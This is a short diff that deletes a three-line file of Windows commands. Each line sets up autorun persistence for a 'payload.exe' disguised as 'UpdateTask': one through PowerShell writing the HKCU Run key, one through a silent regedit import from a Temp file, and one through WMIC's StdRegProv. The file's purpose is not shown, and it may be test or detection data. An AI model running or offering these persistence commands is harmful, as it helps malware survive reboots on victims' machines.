@@ -1,3 +1,0 @@
-powershell.exe -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateTask' -Value 'payload.exe'"
-regedit.exe /s C:\Windows\Temp\persistence.reg
-wmic /NAMESPACE:\\root\default Class StdRegProv Call SetStringValue hDefKey="&H80000001" sSubKeyName="Software\Microsoft\Windows\CurrentVersion\Run" sValueName="UpdateTask" sValue="payload.exe"
